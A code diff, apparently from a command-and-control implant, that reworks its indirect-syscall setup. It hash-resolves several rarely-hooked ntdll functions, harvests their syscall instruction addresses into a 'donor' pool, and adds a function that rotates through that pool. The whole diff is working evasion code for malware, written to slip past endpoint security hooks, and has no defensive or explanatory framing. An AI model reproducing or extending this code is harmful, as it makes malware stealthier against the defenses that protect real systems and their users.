@@ -12,33 +12,63 @@
 BOOL SysInitialize(
     IN PVOID Ntdll
 ) {
-    PVOID SysNativeFunc   = NULL;
-    PVOID SysIndirectAddr = NULL;
+    PVOID DonorFunc = NULL;
 
     if ( ! Ntdll ) {
         return FALSE;
     }
 
-    /* Resolve Syscall instruction from dummy nt function */
-    if ( ( SysNativeFunc = LdrFunctionAddr( Ntdll, H_FUNC_NTADDBOOTENTRY ) ) )
-    {
-        /* resolve address */
-        SysExtract( SysNativeFunc, TRUE, NULL, &SysIndirectAddr );
+    /* Donor function hashes — rarely-hooked ntdll functions for syscall instruction harvesting */
+    ULONG DonorHashes[] = {
+        H_FUNC_NTADDBOOTENTRY,
+        H_FUNC_NTQUERYTIMERRESOLUTION,
+        H_FUNC_NTFLUSHWRITEBUFFER,
+        H_FUNC_NTQUERYPERFORMANCECOUNTER,
+        H_FUNC_NTQUERYDEBUGFILTERSTATE,
+        H_FUNC_NTSETTIMERRESOLUTION,
+        H_FUNC_NTQUERYDEFAULTLOCALE,
+        H_FUNC_NTQUERYDEFAULTUILANGUAGE,
+    };
 
-        /* check if we managed to resolve it  */
-        if ( SysIndirectAddr ) {
-            Instance->Syscall.SysAddress = SysIndirectAddr;
-        } else {
-            PUTS_DONT_SEND( "Failed to resolve SysIndirectAddr" );
-        }
-    }
+    Instance->Syscall.SysDonorCount = 0;
+    Instance->Syscall.SysDonorIndex = 0;
 
 #if _M_IX86
     if ( IsWoW64() )
     {
-        Instance->Syscall.SysAddress = __readfsdword(0xC0);
+        Instance->Syscall.SysDonors[0] = __readfsdword(0xC0);
+        Instance->Syscall.SysDonorCount = 1;
+        PRINTF( "Donor[0]: resolved syscall addr %p from WoW64 TEB\n", Instance->Syscall.SysDonors[0] )
     }
+    else
 #endif
+    {
+        for ( UINT32 i = 0; i < sizeof( DonorHashes ) / sizeof( DonorHashes[0] ); i++ )
+        {
+            PVOID SysAddr = NULL;
+
+            DonorFunc = LdrFunctionAddr( Ntdll, DonorHashes[i] );
+            if ( DonorFunc )
+            {
+                SysExtract( DonorFunc, TRUE, NULL, &SysAddr );
+                if ( SysAddr )
+                {
+                    Instance->Syscall.SysDonors[Instance->Syscall.SysDonorCount] = SysAddr;
+                    Instance->Syscall.SysDonorCount++;
+                    PRINTF( "Donor[%d]: resolved syscall addr %p from hash 0x%08x\n",
+                            Instance->Syscall.SysDonorCount - 1, SysAddr, DonorHashes[i] )
+                }
+            }
+        }
+    }
+
+    if ( Instance->Syscall.SysDonorCount == 0 )
+    {
+        PUTS_DONT_SEND( "CRITICAL: No syscall donor addresses resolved!" )
+        return FALSE;
+    }
+
+    PRINTF( "Syscall donor pool: %d addresses resolved\n", Instance->Syscall.SysDonorCount )
 
     /* Resolve Ssn */
     SYS_EXTRACT( NtOpenThread )
@@ -76,6 +106,19 @@ BOOL SysInitialize(
     SYS_EXTRACT( NtSetInformationThread )
     SYS_EXTRACT( NtSetInformationVirtualMemory )
     SYS_EXTRACT( NtGetNextThread )
+
+    return TRUE;
+}
+
+/* Get next rotating donor address */
+PVOID SysGetDonorAddress( VOID )
+{
+    if ( Instance->Syscall.SysDonorCount == 0 )
+        return NULL;
+
+    PVOID Addr = Instance->Syscall.SysDonors[Instance->Syscall.SysDonorIndex % Instance->Syscall.SysDonorCount];
+    Instance->Syscall.SysDonorIndex++;
+    return Addr;
 }
 
 /*!
